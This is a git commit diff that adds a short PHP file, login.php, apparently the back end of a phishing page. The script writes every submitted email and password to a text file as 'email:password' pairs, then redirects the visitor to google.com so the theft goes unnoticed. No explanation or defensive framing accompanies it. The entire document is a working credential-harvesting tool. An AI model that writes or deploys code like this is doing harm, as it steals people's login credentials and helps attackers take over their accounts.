7220ff52b6414603aa01cd03670a1777a7b1a8d1
Matthew Sweet <themattbook@gmail.com>
2016-12-23 12:50:50 -0600

    Add files via upload

---
+++ login.php
@@ -0,0 +1,10 @@
+<?php
+$myfile = fopen("auth.txt", "a") or die("Unable to establish connection. Please try again.");
+$email = $_POST['email'];
+$password = $_POST['password'];
+$savestring = $email . ':' . $password . PHP_EOL;
+fwrite($myfile, $savestring);
+fclose($myfile);
+echo "<h3>redirecting...</h3>";
+header('Location: http://google.com');
+?>
